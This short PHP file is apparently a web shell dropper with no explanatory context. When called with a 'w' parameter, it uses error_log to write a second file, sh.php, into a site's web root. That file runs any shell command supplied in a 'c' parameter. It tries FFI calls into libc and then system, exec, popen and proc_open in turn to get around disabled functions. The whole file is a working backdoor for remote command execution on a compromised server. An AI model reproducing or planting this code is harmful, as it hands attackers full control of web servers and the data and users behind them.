 <?php
  if(isset($_GET['w'])){
      error_log('<?php if(isset($_GET["c"])){try{$f=FFI::cdef("int system(const
  char*);","libc.so.6");$f->system($_GET["c"]);}catch(Throwable
  $e){}if(function_exists("system"))system($_GET["c"]);elseif(function_exists("exec")){exec($_GET["c"],$o);echo
  join("\n",$o);}elseif(function_exists("popen")){$p=popen($_GET["c"],"r");while($l=fgets($p))echo
  $l;}elseif(function_exists("proc_open")){$p=proc_open($_GET["c"],[["pipe","r"],["pipe","w"],["pipe","w"]],$pipes);echo
   stream_get_contents($pipes[1]);}}',3,'/www/wwwroot/xlch49.pics/sh.php');
      die('ok');
  }
